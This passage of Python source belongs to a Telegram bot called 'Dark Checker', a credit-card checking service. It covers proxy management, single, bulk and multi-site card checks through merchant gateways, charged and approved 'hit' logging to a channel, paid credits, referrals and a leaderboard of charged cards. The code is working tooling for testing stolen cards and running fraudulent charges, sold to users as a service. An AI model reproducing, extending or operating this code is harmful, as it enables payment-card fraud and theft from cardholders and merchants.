    lines = full_text.strip().split('\n')
    
    if len(lines) < 2:
        return await event.reply("❌ Usage:\n<code>/addproxy</code>\n<code>ip:port:user:pass</code>\n<code>ip:port:user:pass</code>\n\nAdd one proxy per line after the command.", parse_mode='html')
    
    # Skip first line (command), rest are proxies
    proxy_lines = [p.strip() for p in lines[1:] if p.strip()]
    
    current_proxies = load_proxies()
    added = 0
    already = 0
    
    for proxy in proxy_lines:
        if proxy not in current_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                await f.write(f"{proxy}\n")
            current_proxies.append(proxy)
            added += 1
        else:
            already += 1
    
    await event.reply(f"✅ <b>Proxies Added!</b>\n\n➕ New: {added}\n⏭️ Already existed: {already}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxytxt(@\w+)?(\s+)?'))
async def addproxytxt_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/addproxytxt</code>", parse_mode='html')
    
    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')
    
    if not replied.file.name.endswith('.txt'):
        return await event.reply("❌ Only .txt files supported!", parse_mode='html')
    
    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')
    
    file_path = f"proxies_bulk_{user_id}.txt"
    await bot.download_media(replied, file_path)
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    os.remove(file_path)
    
    current_proxies = load_proxies()
    added = 0
    already = 0
    
    for proxy in lines:
        if proxy not in current_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                await f.write(f"{proxy}\n")
            current_proxies.append(proxy)
            added += 1
        else:
            already += 1
    
    await status_msg.edit(f"✅ <b>Proxies Added!</b>\n\n➕ New: {added}\n⏭️ Already existed: {already}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy(@\w+)?(\s+)?'))
async def chkproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/chkproxy ip:port:user:pass</code>", parse_mode='html')
    
    proxy = args[1].strip()
    status_msg = await event.reply(f"🔄 Checking proxy...", parse_mode='html')
    
    result = await test_proxy(proxy)
    
    if result['status'] == 'alive':
        await status_msg.edit(f"✅ <b>Proxy is ALIVE!</b>\n\n🔌 <code>{proxy}</code>", parse_mode='html')
    else:
        await status_msg.edit(f"❌ <b>Proxy is DEAD!</b>\n\n🔌 <code>{proxy}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy(@\w+)?(\s+)?'))
async def rmproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rmproxy ip:port:user:pass</code>", parse_mode='html')
    
    proxy = args[1].strip()
    proxies = load_proxies()
    
    if proxy not in proxies:
        return await event.reply("❌ Proxy not found!", parse_mode='html')
    
    new_proxies = [p for p in proxies if p != proxy]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in new_proxies:
            await f.write(f"{p}\n")
    
    await event.reply(f"✅ <b>Proxy Removed!</b>\n\n🔌 <code>{proxy}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex(@\w+)?(\s+)?'))
async def rmproxyindex_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rmproxyindex 1,2,3</code>", parse_mode='html')
    
    indexes_str = args[1].strip()
    try:
        indexes = [int(i.strip()) - 1 for i in indexes_str.split(',') if i.strip().isdigit()]
    except:
        return await event.reply("❌ Invalid indexes! Use format: 1,2,3", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ No proxies available.", parse_mode='html')
    
    removed = []
    new_proxies = []
    for idx, proxy in enumerate(proxies):
        if idx in indexes:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    
    if not removed:
        return await event.reply("❌ No proxies found at those indexes.", parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in new_proxies:
            await f.write(f"{p}\n")
    
    msg = f"✅ <b>Proxies Removed!</b>\n\n🗑️ Removed {len(removed)} proxies:\n"
    for r in removed[:10]:
        msg += f"🔌 {r}\n"
    
    await event.reply(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy(@\w+)?(?:\s|$)'))
async def clearproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ `proxy.txt` is already empty.", parse_mode='html')
    
    total = len(proxies)
    
    # Backup
    backup_file = f"proxy_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(backup_file, 'w', encoding='utf-8') as f:
        for p in proxies:
            f.write(f"{p}\n")
    
    # Clear
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write('')
    
    await event.reply(f"✅ <b>Proxies Cleared!</b>\n\n🗑️ Removed: {total} proxies\n💾 Backup saved: <code>{backup_file}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy(@\w+)?(?:\s|$)'))
async def getproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if not os.path.exists(PROXY_FILE):
        return await event.reply("❌ `proxy.txt` file not found.", parse_mode='html')
    
    proxies = get_file_lines(PROXY_FILE)
    if not proxies:
        return await event.reply("❌ `proxy.txt` is empty.", parse_mode='html')
    
    total = len(proxies)
    await event.reply(
        f"📄 <b>Proxy File</b>\n\n📊 Total Proxies: {total}\n\n✅ Sending <code>proxy.txt</code> file...",
        file=PROXY_FILE,
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/setproxy(@\w+)?(\s+)?'))
async def setproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/setproxy ip:port:user:pass</code>", parse_mode='html')
    
    proxy = args[1].strip()
    if add_user_proxy(user_id, proxy):
        await event.reply(f"✅ <b>Personal Proxy Added!</b>\n\n🔌 <code>{proxy}</code>\n\nUse /myproxy to view your proxies.", parse_mode='html')
    else:
        await event.reply("❌ Proxy already exists in your list.", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy(@\w+)?(?:\s|$)'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    my_proxies = get_user_specific_proxies(user_id)
    if not my_proxies:
        return await event.reply("❌ You don't have any personal proxies.\n\nUse <code>/setproxy proxy</code> to add one.", parse_mode='html')
    
    msg = f"<b>🔌 Your Personal Proxies</b>\n<b>─────────────────────</b>\n\n"
    for i, proxy in enumerate(my_proxies, 1):
        msg += f"<blockquote>{i}. <code>{proxy}</code></blockquote>\n"
    msg += f"\n<b>Total:</b> {len(my_proxies)}"
    
    await event.reply(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/delmyproxy(@\w+)?(\s+)?'))
async def delmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/delmyproxy ip:port:user:pass</code>", parse_mode='html')
    
    proxy = args[1].strip()
    if remove_user_proxy(user_id, proxy):
        await event.reply(f"✅ <b>Personal Proxy Removed!</b>\n\n🔌 <code>{proxy}</code>", parse_mode='html')
    else:
        await event.reply("❌ Proxy not found in your list.", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearmyproxy(@\w+)?(?:\s|$)'))
async def clearmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if clear_user_proxies(user_id):
        await event.reply("✅ <b>All Personal Proxies Cleared!</b>", parse_mode='html')
    else:
        await event.reply("❌ You don't have any personal proxies.", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc(@\w+)?(\s+)?'))
async def cc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    is_group = event.is_group
    if is_group:
        if not is_group_enabled(event.chat_id):
            return
    else:
        if not is_premium(user_id) and not is_admin(user_id):
            return await event.reply("❌ <b>Premium Required!</b>\n\nUse /plans to upgrade.", parse_mode='html')
    
    # Rate limit
    can_proceed, wait_time = check_rate_limit(user_id)
    if not can_proceed and not is_admin(user_id):
        return await event.reply(f"⏳ Rate limit! Wait {wait_time}s", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/cc 5154623245618097|03|2032|156</code>", parse_mode='html')
    
    card_text = args[1].strip()
    cards = extract_cc(card_text)
    
    if not cards:
        return await event.reply("❌ Invalid card format!\n\nFormat: <code>card|mm|yy|cvv</code>", parse_mode='html')
    
    card = cards[0]
    
    # Deduct credit (not for group)
    if not is_group and not is_admin(user_id):
        success, remaining = deduct_credit(user_id)
        if not success:
            return await event.reply(f"❌ Insufficient credits!\n\n💰 Your balance: {remaining}\nUse /redeemcredit to add credits.", parse_mode='html')
        await check_credits_low(user_id)
    
    sites = load_sites()
    proxies = load_proxies()
    
    # Use user's personal proxies if available
    user_proxies = get_user_specific_proxies(user_id)
    if user_proxies:
        proxies = user_proxies
    
    if not sites:
        return await event.reply("❌ No sites available. Contact admin.", parse_mode='html')
    if not proxies:
        return await event.reply("❌ No proxies available. Contact admin.", parse_mode='html')
    
    status_msg = await event.reply("🔄 <b>Checking card...</b>", parse_mode='html')
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, lambda: asyncio.run(check_card_with_retry(card, sites, proxies)))
    
    status_text = result['status']
    response_msg = result.get('message', '')
    gateway = result.get('gateway', 'Unknown')
    price = result.get('price', '-')
    
    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)
    
    if status_text == "Charged":
        status_emoji = "⚡"
        record_hit(user_id, 'charged')
        username = event.sender.username
        try:
            await send_realtime_hit_to_user(user_id, "CHARGED", card, response_msg, gateway, price)
        except:
            pass
        try:
            await send_log_to_channel(response_msg, gateway, price, username, user_id, card)
        except:
            pass
    elif status_text == "Approved":
        status_emoji = "💀"
        record_hit(user_id, 'approved')
        try:
            await send_realtime_hit_to_user(user_id, "APPROVED", card, response_msg, gateway, price)
        except:
            pass
    else:
        status_emoji = "⬛"
        record_dead(user_id)
    
    remaining_credits = get_user_credits(user_id)
    
    result_text = f"""<b>💀💳 Dark Checker 💳💀</b>
<b>─────────────────────</b>
{status_emoji} <b>Status:</b> {status_text} (via /cc)
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {response_msg[:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway} | 💰 {price}</blockquote>
<b>─────────────────────</b>
<b>📊 BIN INFO</b>
<pre>🏦 Brand: {brand} - {bin_type} - {level}
🏛️ Bank: {bank}
🌍 Country: {country} {flag}</pre>
<b>─────────────────────</b>
💰 <b>Credits Left:</b> {remaining_credits}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    
    await status_msg.edit(result_text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chk(@\w+)?(\s+)?'))
async def chk_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if not event.is_group:
        if not is_premium(user_id) and not is_admin(user_id):
            return await event.reply("❌ <b>Premium Required!</b>\n\nUse /plans to upgrade.", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/chk</code>\n\nFile format: one card per line\n<code>card|mm|yy|cvv</code>", parse_mode='html')
    
    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')
    
    if not replied.file.name.endswith('.txt'):
        return await event.reply("❌ Only .txt files supported!", parse_mode='html')
    
    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')
    
    file_path = f"cards_{user_id}.txt"
    await bot.download_media(replied, file_path)
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    os.remove(file_path)
    
    cards = []
    for line in lines:
        extracted = extract_cc(line)
        cards.extend(extracted)
    
    if not cards:
        return await status_msg.edit("❌ No valid cards found in the file.\n\nFormat: <code>card|mm|yy|cvv</code>", parse_mode='html')
    
    original_count = len(cards)
    
    # Limit cards based on credits (non-admin, non-group)
    if not event.is_group and not is_admin(user_id):
        user_credits = get_user_credits(user_id)
        if original_count > user_credits:
            cards = cards[:user_credits]
    
    total_cards = len(cards)
    
    if total_cards == 0:
        return await status_msg.edit("❌ Insufficient credits!", parse_mode='html')
    
    sites = load_sites()
    proxies = load_proxies()
    user_proxies = get_user_specific_proxies(user_id)
    if user_proxies:
        proxies = user_proxies
    
    if not sites:
        return await status_msg.edit("❌ No sites available. Contact admin.", parse_mode='html')
    if not proxies:
        return await status_msg.edit("❌ No proxies available. Contact admin.", parse_mode='html')
    
    # Deduct credits upfront
    if not event.is_group and not is_admin(user_id):
        for _ in range(total_cards):
            deduct_credit(user_id)
        await check_credits_low(user_id)
    
    await status_msg.edit(f"🔄 Starting check of {total_cards} cards...", parse_mode='html')
    
    results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'start_time': time.time(),
        'total': total_cards
    }
    
    progress_msg = await bot.send_message(user_id, "Initializing...", parse_mode='html')
    
    session_id = f"{user_id}_{int(time.time())}"
    active_sessions[session_id] = {'status': 'active', 'user_id': user_id}
    
    try:
        for idx, card in enumerate(cards):
            if session_id not in active_sessions:
                break
            
            while active_sessions.get(session_id, {}).get('status') == 'paused':
                await asyncio.sleep(1)
            
            if session_id not in active_sessions:
                break
            
            result = await check_card_with_retry(card, sites, proxies)
            
            status = result['status']
            if status == 'Charged':
                results['charged'].append(result)
                record_hit(user_id, 'charged')
                username = event.sender.username
                try:
                    await send_realtime_hit_to_user(user_id, "CHARGED", card, result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'))
                except:
                    pass
                try:
                    await send_log_to_channel(result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id, card)
                except:
                    pass
            elif status == 'Approved':
                results['approved'].append(result)
                record_hit(user_id, 'approved')
                try:
                    await send_realtime_hit_to_user(user_id, "APPROVED", card, result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'))
                except:
                    pass
            else:
                results['dead'].append(result)
                record_dead(user_id)
            
            if (idx + 1) % 5 == 0:
                await update_progress(user_id, progress_msg.id, results, idx + 1)
            
            await asyncio.sleep(0.2)
        
        if session_id in active_sessions:
            del active_sessions[session_id]
        
        await update_progress(user_id, progress_msg.id, results, total_cards)
        await send_final_results(user_id, results)
        
    except Exception as e:
        if session_id in active_sessions:
            del active_sessions[session_id]
        await status_msg.edit(f"❌ Error: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/multi(@\w+)?(\s+)?'))
async def multi_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if not event.is_group:
        if not is_premium(user_id) and not is_admin(user_id):
            return await event.reply("❌ <b>Premium Required!</b>\n\nUse /plans to upgrade.", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/multi card1|mm|yy|cvv card2|mm|yy|cvv ...</code>", parse_mode='html')
    
    card_text = args[1].strip()
    cards = extract_cc(card_text)
    
    if not cards:
        return await event.reply("❌ No valid cards found!\n\nFormat: <code>card|mm|yy|cvv</code>", parse_mode='html')
    
    # Limit by credits
    if not event.is_group and not is_admin(user_id):
        user_credits = get_user_credits(user_id)
        if len(cards) > user_credits:
            cards = cards[:user_credits]
    
    total_cards = len(cards)
    if total_cards == 0:
        return await event.reply("❌ Insufficient credits!", parse_mode='html')
    
    sites = load_sites()
    proxies = load_proxies()
    user_proxies = get_user_specific_proxies(user_id)
    if user_proxies:
        proxies = user_proxies
    
    if not sites:
        return await event.reply("❌ No sites available. Contact admin.", parse_mode='html')
    if not proxies:
        return await event.reply("❌ No proxies available. Contact admin.", parse_mode='html')
    
    # Deduct credits
    if not event.is_group and not is_admin(user_id):
        for _ in range(total_cards):
            deduct_credit(user_id)
        await check_credits_low(user_id)
    
    status_msg = await event.reply(f"🔄 Checking {total_cards} cards...", parse_mode='html')
    
    results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'start_time': time.time(),
        'total': total_cards
    }
    
    progress_msg = await bot.send_message(user_id, "Initializing...", parse_mode='html')
    
    session_id = f"{user_id}_{int(time.time())}"
    active_sessions[session_id] = {'status': 'active', 'user_id': user_id}
    
    try:
        for idx, card in enumerate(cards):
            if session_id not in active_sessions:
                break
            
            while active_sessions.get(session_id, {}).get('status') == 'paused':
                await asyncio.sleep(1)
            
            if session_id not in active_sessions:
                break
            
            result = await check_card_with_retry(card, sites, proxies)
            
            status = result['status']
            if status == 'Charged':
                results['charged'].append(result)
                record_hit(user_id, 'charged')
                username = event.sender.username
                try:
                    await send_realtime_hit_to_user(user_id, "CHARGED", card, result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'))
                except:
                    pass
                try:
                    await send_log_to_channel(result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id, card)
                except:
                    pass
            elif status == 'Approved':
                results['approved'].append(result)
                record_hit(user_id, 'approved')
                try:
                    await send_realtime_hit_to_user(user_id, "APPROVED", card, result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'))
                except:
                    pass
            else:
                results['dead'].append(result)
                record_dead(user_id)
            
            if (idx + 1) % 5 == 0:
                await update_progress(user_id, progress_msg.id, results, idx + 1)
            
            await asyncio.sleep(0.2)
        
        if session_id in active_sessions:
            del active_sessions[session_id]
        
        await update_progress(user_id, progress_msg.id, results, total_cards)
        await send_final_results(user_id, results)
        
    except Exception as e:
        if session_id in active_sessions:
            del active_sessions[session_id]
        await status_msg.edit(f"❌ Error: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/mcc(@\w+)?(\s+)?'))
async def mcc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if not event.is_group:
        if not is_premium(user_id) and not is_admin(user_id):
            return await event.reply("❌ <b>Premium Required!</b>\n\nUse /plans to upgrade.", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/mcc card|mm|yy|cvv</code>", parse_mode='html')
    
    card_text = args[1].strip()
    cards = extract_cc(card_text)
    
    if not cards:
        return await event.reply("❌ Invalid card format!\n\nFormat: <code>card|mm|yy|cvv</code>", parse_mode='html')
    
    card = cards[0]
    sites = load_sites()
    proxies = load_proxies()
    user_proxies = get_user_specific_proxies(user_id)
    if user_proxies:
        proxies = user_proxies
    
    if not sites:
        return await event.reply("❌ No sites available. Contact admin.", parse_mode='html')
    if not proxies:
        return await event.reply("❌ No proxies available. Contact admin.", parse_mode='html')
    
    # Deduct credits equal to number of sites
    if not event.is_group and not is_admin(user_id):
        user_credits = get_user_credits(user_id)
        if user_credits < len(sites):
            return await event.reply(f"❌ Insufficient credits!\n\n💰 Need: {len(sites)} credits\n💳 You have: {user_credits}", parse_mode='html')
        for _ in range(len(sites)):
            deduct_credit(user_id)
        await check_credits_low(user_id)
    
    status_msg = await event.reply(f"🔄 Checking card against {len(sites)} sites...", parse_mode='html')
    
    results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'start_time': time.time(),
        'total': len(sites)
    }
    
    for i, site in enumerate(sites):
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        
        status = result['status']
        if status == 'Charged':
            results['charged'].append(result)
            record_hit(user_id, 'charged')
            username = event.sender.username
            try:
                await send_realtime_hit_to_user(user_id, "CHARGED", card, result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'))
            except:
                pass
            try:
                await send_log_to_channel(result.get('message', ''), result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id, card)
            except:
                pass
        elif status == 'Approved':
            results['approved'].append(result)
            record_hit(user_id, 'approved')
        else:
            results['dead'].append(result)
            record_dead(user_id)
        
        if (i + 1) % 10 == 0 or (i + 1) == len(sites):
            progress = f"🔄 {i+1}/{len(sites)} sites checked\n⚡ {len(results['charged'])} Charged | 💀 {len(results['approved'])} Live | ⬛ {len(results['dead'])} Dead"
            try:
                await status_msg.edit(progress, parse_mode='html')
            except:
                pass
        
        await asyncio.sleep(0.1)
    
    await send_final_results(user_id, results)

# ========== CALLBACK HANDLERS ==========
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_callback(event):
    user_id = event.sender_id
    for sid, sdata in active_sessions.items():
        if sdata['user_id'] == user_id:
            active_sessions[sid]['status'] = 'paused'
            await event.answer("⏸️ Checker paused!")
            return
    await event.answer("❌ No active checker session found.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_callback(event):
    user_id = event.sender_id
    for sid, sdata in active_sessions.items():
        if sdata['user_id'] == user_id:
            active_sessions[sid]['status'] = 'active'
            await event.answer("▶️ Checker resumed!")
            return
    await event.answer("❌ No active checker session found.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_callback(event):
    user_id = event.sender_id
    sessions_to_remove = []
    for sid, sdata in active_sessions.items():
        if sdata['user_id'] == user_id:
            sessions_to_remove.append(sid)
    for sid in sessions_to_remove:
        del active_sessions[sid]
    if sessions_to_remove:
        await event.answer("⏹️ Checker stopped!")
    else:
        await event.answer("❌ No active checker session found.", alert=True)

# ========== ADDITIONAL USER COMMANDS ==========
@bot.on(events.NewMessage(pattern=r'^/refer(@\w+)?(?:\s|$)'))
async def refer_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    code = get_referral_code(user_id)
    bot_username = (await bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={code}"
    
    data = load_referrals()
    user_data = data.get(str(user_id), {})
    total_referred = len(user_data.get('referred', []))
    total_earned = user_data.get('total_earned', 0)
    
    text = f"""<b>👥 Your Referral Info</b>
<b>─────────────────────</b>

🔗 <b>Referral Link:</b>
<code>{ref_link}</code>

📊 <b>Stats:</b>
<blockquote>👥 Total Referred: {total_referred}
💰 Total Earned: {total_earned} credits</blockquote>

💡 Each referral earns you <b>{REFERRAL_REWARD} credits</b>!
Share your link with friends to earn free credits!

<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myhistory(@\w+)?(?:\s|$)'))
async def myhistory_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    data = load_hit_stats()
    uid = str(user_id)
    user_stats = data.get(uid, {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0})
    
    text = f"""<b>📊 Your Hit Statistics</b>
<b>─────────────────────</b>

<blockquote>⚡ Charged: {user_stats.get('charged', 0)}
💀 Approved: {user_stats.get('approved', 0)}
⬛ Dead: {user_stats.get('dead', 0)}
💳 Total Checks: {user_stats.get('total', 0)}</blockquote>

<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/topusers(@\w+)?(?:\s|$)'))
async def topusers_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    data = load_hit_stats()
    if not data:
        return await event.reply("❌ No hit data available yet.", parse_mode='html')
    
    # Sort by charged hits
    sorted_users = sorted(data.items(), key=lambda x: x[1].get('charged', 0), reverse=True)[:10]
    
    text = f"<b>🏆 Top 10 Users - Charged Hits</b>\n<b>─────────────────────</b>\n\n"
    medals = ["🥇", "🥈", "🥉"] + ["4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    
    for i, (uid, stats) in enumerate(sorted_users):
        medal = medals[i] if i < len(medals) else "➡️"
        text += f"<blockquote>{medal} <code>{uid}</code> — ⚡ {stats.get('charged', 0)} Charged | 💀 {stats.get('approved', 0)} Live | 📊 {stats.get('total', 0)} Total</blockquote>\n"
    
    text += f"\n<b>─────────────────────</b>\n🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"
    
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/transfercredits(@\w+)?(\s+)?'))
async def transfercredits_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/transfercredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply("❌ Invalid user_id or amount.", parse_mode='html')
    
    if amount <= 0:
        return await event.reply("❌ Amount must be positive!", parse_mode='html')
    
    if target_id == user_id:
        return await event.reply("❌ You cannot transfer credits to yourself!", parse_mode='html')
    
    user_credits = get_user_credits(user_id)
    if user_credits < amount:
        return await event.reply(f"❌ Insufficient credits!\n\n💰 Your balance: {user_credits}\n💸 Transfer amount: {amount}", parse_mode='html')
    
    remove_credits(user_id, amount)
    add_credits(target_id, amount)
    
    new_balance = get_user_credits(user_id)
    
    await event.reply(f"✅ <b>Credits Transferred!</b>\n\n💰 Amount: {amount} credits\n👤 To: <code>{target_id}</code>\n💳 Your new balance: {new_balance}", parse_mode='html')
    
    try:
        await bot.send_message(target_id, f"💰 <b>You received {amount} credits!</b>\n\nFrom: <code>{user_id}</code>\n\nUse /info to check your balance.", parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/ping(@\w+)?(?:\s|$)'))
async def ping_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    start_time = time.time()
    msg = await event.reply("🏓 Pong!", parse_mode='html')
    end_time = time.time()
    
    latency = round((end_time - start_time) * 1000, 2)
    await msg.edit(f"🏓 <b>Pong!</b>\n\n⏱️ Latency: <code>{latency}ms</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/allstats(@\w+)?(?:\s|$)'))
async def allstats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    hit_data = load_hit_stats()
    if not hit_data:
        return await event.reply("❌ No hit data available.", parse_mode='html')
    
    total_charged = sum(s.get('charged', 0) for s in hit_data.values())
    total_approved = sum(s.get('approved', 0) for s in hit_data.values())
    total_dead = sum(s.get('dead', 0) for s in hit_data.values())
    total_checks = sum(s.get('total', 0) for s in hit_data.values())
    
    text = f"""<b>📊 Full Hit Statistics</b>
<b>─────────────────────</b>

<b>Overall:</b>
<blockquote>⚡ Total Charged: {total_charged}
💀 Total Approved: {total_approved}
⬛ Total Dead: {total_dead}
💳 Total Checks: {total_checks}</blockquote>

<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/userlist(@\w+)?(?:\s|$)'))
async def userlist_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    premium_data = load_premium_users()
    if not premium_data:
        return await event.reply("❌ No premium users.", parse_mode='html')
    
    text = f"<b>👥 Premium Users ({len(premium_data)})</b>\n<b>─────────────────────</b>\n\n"
    
    for uid, data in sorted(premium_data.items()):
        expiry = data.get('expiry', 'Unknown')
        plan_name = get_user_plan_name(int(uid))
        if expiry != 'Unknown':
            try:
                expiry_dt = datetime.fromisoformat(expiry)
                days_left = max(0, (expiry_dt - datetime.now()).days)
                expiry_str = expiry_dt.strftime('%Y-%m-%d')
            except:
                days_left = 0
                expiry_str = expiry
        else:
            days_left = 0
            expiry_str = 'Unknown'
        
        text += f"<blockquote>👤 <code>{uid}</code> — {plan_name} — ⏳ {days_left}d left</blockquote>\n"
    
    text += f"\n<b>─────────────────────</b>\n🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"
    
    await event.reply(text, parse_mode='html')

